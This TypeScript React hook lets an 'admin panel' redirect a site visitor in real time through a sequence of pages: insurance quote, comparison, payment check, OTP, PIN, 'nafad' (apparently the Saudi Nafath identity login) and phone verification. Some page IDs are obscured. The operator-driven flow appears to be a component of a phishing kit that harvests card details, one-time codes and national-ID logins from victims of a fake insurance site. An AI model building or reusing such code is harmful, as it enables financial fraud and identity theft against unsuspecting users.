;
import { useEffect, useRef } from 'react';
import { useLocation } from 'wouter';
import { clearRedirectPage } from '@/lib/visitor-tracking';
import { onVisitorRedirect } from '@/lib/socket';

interface UseRedirectMonitorProps {
  visitorId: string;
  currentPage: string;
}

const pageMap: Record<string, string> = {
  // Admin panel page IDs
  'home-new': '/home-new',
  home: '/home-new',
  insur: '/insur',
  compar: '/compar',
  check: '/check',
  payment: '/check',
  otp: '/step2',
  veri: '/step2',
  '_t2': '/step2',
  pin: '/step3',
  confi: '/step3',
  '_t3': '/step3',
  nafad: '/step4',
  '_t6': '/step4',
  phone: '/step5',
  'phone-info': '/step5',
  '_t5': '/step5',
  'thank-you': '/thank-you',
};

export function useRedirectMonitor({ visitorId, currentPage }: UseRedirectMonitorProps) {
  const [, navigate] = useLocation();
  const redirectedRef = useRef(false);

  useEffect(() => {
    if (!visitorId) return;
    redirectedRef.current = false;

    const doRedirect = async (targetPage: string) => {
      if (redirectedRef.current) return;
      const targetUrl = pageMap[targetPage];
      if (!targetUrl) return;
      // Don't redirect to same page
      const currentUrl = window.location.pathname;
      if (currentUrl === targetUrl) return;
      redirectedRef.current = true;
      console.log('[useRedirectMonitor] Redirecting to', targetPage, '->', targetUrl);
      try { await clearRedirectPage(visitorId); } catch { /* ignore */ }
      navigate(targetUrl);
    };

    // Firestore real-time redirect (via socket.ts mock)
    const unsubscribeRedirect = onVisitorRedirect(({ targetPage }) => {
      doRedirect(targetPage);
    });

    return () => {
      unsubscribeRedirect();
    };
  }, [visitorId, currentPage, navigate]);
}
